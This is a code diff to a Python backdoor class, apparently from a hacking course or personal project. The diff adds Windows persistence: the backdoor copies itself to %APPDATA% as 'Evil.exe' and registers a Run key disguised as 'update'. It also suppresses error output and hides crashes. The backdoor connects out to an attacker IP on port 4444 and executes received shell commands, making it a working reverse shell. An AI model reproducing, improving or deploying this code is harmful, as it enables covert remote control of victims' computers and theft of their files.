@@ -1,9 +1,16 @@
-import os, socket, subprocess, json, base64
+import os, socket, subprocess, json, base64, sys, shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
+        
+    def become_persistent(self):
+        evil_file_location = os.environ['appdata'] + '\\Evil.exe'
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -19,7 +26,8 @@ class Backdoor:
                 continue
     
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True).decode()
+        DEVNULL = open(os.devnull, 'wb')
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()
     
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -40,7 +48,7 @@ class Backdoor:
             try:
                 if command[0] == 'exit':
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == 'cd' and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == 'download':
@@ -50,10 +58,13 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command)
             except Exception:
-                # return '[-] Error During Command Execution.'
-                return '[-] Error executing this Command.'
+                return '[-] Error During Command Execution.'
+                # return '[-] Error executing this Command.'
                 
             self.reliable_send(command_result)
 
-my_backdoor = Backdoor('10.38.1.110', 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor('10.38.1.110', 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
